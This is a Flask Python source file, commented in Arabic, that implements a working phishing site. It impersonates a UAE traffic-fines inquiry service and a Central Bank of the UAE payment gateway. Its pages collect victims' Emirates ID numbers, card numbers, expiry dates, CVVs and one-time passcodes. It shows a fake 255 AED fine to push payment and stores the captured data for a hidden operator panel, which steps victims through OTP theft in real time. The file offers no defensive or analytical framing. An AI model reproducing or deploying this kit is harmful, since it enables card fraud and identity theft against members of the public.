import os
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# قاعدة بيانات التحكم والبيانات
db = {
    "logs": [],
    "status": "waiting", # waiting, go_otp, error_card, go_pin, error_otp
    "current_client": {}
}

# --- 1. الصفحة الرئيسية (التصميم الكامل 8 صور) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html { margin:0; padding:0; width:100%; background:#fff; }
    .wrapper { position:relative; max-width:600px; margin:0 auto; }
    .wrapper img { width:100%; display:block; }
    .sticky-h { position:sticky; top:0; z-index:1000; width:100%; background:white; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
    .btn-link { position:absolute; left:10%; width:80%; height:50px; background:rgba(0,0,0,0); cursor:pointer; border:none; }
</style>
</head>
<body>
    <div class="sticky-h"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg"></div>
    <div class="wrapper">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <button class="btn-link" style="top:270px;" onclick="location.href='/search'"></button>
        <button class="btn-link" style="top:320px;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (المربع الكبير والخيارات الشاملة) ---
SEARCH_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background:#f4f4f4; font-family:sans-serif; margin:0; }
    .mega-card { background:white; max-width:750px; margin:30px auto; border-radius:15px; box-shadow:0 10px 40px rgba(0,0,0,0.1); border-top:10px solid #b0914f; overflow:hidden; }
    .head { background:#b0914f; color:white; padding:25px; text-align:center; font-size:22px; font-weight:bold; }
    .form { padding:40px; }
    label { display:block; margin-bottom:10px; font-weight:bold; }
    select, input { width:100%; padding:15px; margin-bottom:20px; border:1px solid #ddd; border-radius:8px; font-size:16px; }
    .grid { display:grid; grid-template-columns: 1.5fr 1fr 2fr; gap:10px; }
    .btn { background:#b0914f; color:white; border:none; padding:20px; width:100%; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; }
</style></head>
<body>
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%;">
    <div class="mega-card">
        <div class="head">نظام الاستعلام عن المخالفات المرورية الموحد</div>
        <form action="/report" method="POST" class="form">
            <label>إمارة مصدر اللوحة / Plate Source:</label>
            <select name="emirate">
                <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
            </select>
            <label>بيانات وفئة اللوحة:</label>
            <div class="grid">
                <select name="cat">
                    <option>خصوصي</option><option>نقل عام</option><option>تجاري</option><option>دراجة</option><option>تصدير</option>
                </select>
                <input type="text" name="code" placeholder="الرمز">
                <input type="text" name="num" placeholder="الرقم">
            </div>
            <label>رقم الهوية الإماراتية:</label>
            <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>
            <button type="submit" class="btn">بحث عن المخالفات</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. صفحة التقرير (عرض المخالفات المكتشفة) ---
REPORT_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    .report { max-width:600px; margin:40px auto; background:white; padding:30px; border-radius:15px; box-shadow:0 5px 20px rgba(0,0,0,0.1); border-right:10px solid #b0914f; }
    .row { display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee; font-size:18px; }
    .btn-pay { background:#b0914f; color:white; width:100%; padding:18px; border:none; border-radius:8px; font-weight:bold; cursor:pointer; display:block; text-align:center; text-decoration:none; margin-top:20px; }
</style></head>
<body>
    <div class="report">
        <h2 style="color:#b0914f; text-align:center;">تفاصيل سجل المخالفات</h2>
        <div class="row"><span>الاسم:</span><b>سعيد محمد العامري</b></div>
        <div class="row"><span>عدد المخالفات:</span><b style="color:red;">1</b></div>
        <div class="row"><span>نوع المخالفة:</span><b>تجاوز السرعة المقررة (رادار)</b></div>
        <div class="row" style="background:#fff9e6; padding:10px;"><span>المبلغ الإجمالي:</span><b style="color:#d9534f; font-size:22px;">255.00 AED</b></div>
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg" style="width:100%; margin-top:15px; border-radius:10px;">
        <a href="/checkout" class="btn-pay">المتابعة للدفع الإلكتروني</a>
    </div>
</body>
</html>
"""

# --- 4. صفحة الدفع الاحترافية (كاشف الفيزا) ---
PAY_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { background:#f4f4f4; font-family:sans-serif; }
    .pay-card { max-width:500px; margin:30px auto; background:white; border-radius:20px; box-shadow:0 15px 40px rgba(0,0,0,0.2); overflow:hidden; border:1px solid #b0914f; }
    .header { background:#b0914f; color:white; padding:25px; text-align:center; }
    .body { padding:30px; }
    .input-box { position:relative; margin-bottom:15px; }
    input { width:100%; padding:15px; border:1px solid #ddd; border-radius:10px; font-size:16px; box-sizing:border-box; }
    .card-logo { position:absolute; left:10px; top:12px; height:30px; display:none; }
    .bank-logos { display:flex; justify-content:center; gap:15px; margin-bottom:20px; }
    .bank-logos img { height:30px; opacity:0.6; }
    .btn { background:#b0914f; color:white; width:100%; padding:20px; border:none; border-radius:10px; font-size:20px; font-weight:bold; cursor:pointer; }
</style></head>
<body>
    <div class="pay-card">
        <div class="header"><h3>بوابة الدفع - مصرف الإمارات المركزي</h3></div>
        <div class="body">
            <div class="bank-logos">
                <img src="https://img.icons8.com/color/48/visa.png">
                <img src="https://img.icons8.com/color/48/mastercard.png">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png">
            </div>
            <form action="/submit-card" method="POST">
                <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
                <div class="input-box">
                    <input type="text" id="cn" name="card" placeholder="رقم البطاقة (16 رقم)" maxlength="19" required>
                    <img id="logo" class="card-logo" src="">
                </div>
                <div style="display:flex; gap:10px;">
                    <input type="text" name="exp" placeholder="MM/YY" maxlength="5">
                    <input type="text" name="cvv" placeholder="CVV" maxlength="3">
                </div>
                <button type="submit" class="btn">تأكيد السداد الآمن</button>
            </form>
        </div>
    </div>
    <script>
        const cn = document.getElementById('cn');
        const logo = document.getElementById('logo');
        cn.addEventListener('input', e => {
            let v = e.target.value.replace(/\\s/g, '');
            if(v.startsWith('4')) { logo.src='https://img.icons8.com/color/48/visa.png'; logo.style.display='block'; }
            else if(v.startsWith('5')) { logo.src='https://img.icons8.com/color/48/mastercard.png'; logo.style.display='block'; }
            else { logo.style.display='none'; }
            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
        });
    </script>
</body>
</html>
"""

# --- 5. صفحة الانتظار ولوحة التحكم ---
WAIT_HTML = """
<script>
    setInterval(() => {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'go_otp') location.href='/otp-page';
            if(d.status === 'error_card') { alert('بيانات البطاقة غير صحيحة'); location.href='/checkout'; }
        });
    }, 2500);
</script>
<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
    <div style="border:8px solid #f3f3f3; border-top:8px solid #b0914f; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:auto;"></div>
    <h2>جاري الاتصال بالمصرف...</h2>
    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
</body>
"""

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/report', methods=['POST'])
def report(): return render_template_string(REPORT_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/submit-card', methods=['POST'])
def submit_card():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_HTML)

@app.route('/h-admin')
def admin():
    return f"<h1>لوحة تحكم حسن</h1><p>البيانات: {str(db['logs'])}</p><button onclick=\\"fetch('/set-status/go_otp')\\">قبول للـ OTP</button><button onclick=\\"fetch('/set-status/error_card')\\">رفض</button>"

@app.route('/set-status/<s>')
def set_status(s):
    db['status'] = s
    return "OK"

@app.route('/check-status')
def check_status(): return jsonify({"status": db['status']})

@app.route('/otp-page')
def otp(): return "<h1>أدخل الرمز المرسل لجوالك (OTP)</h1><form action='/submit-card' method='POST'><input name='otp'><button>تحقق</button></form>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
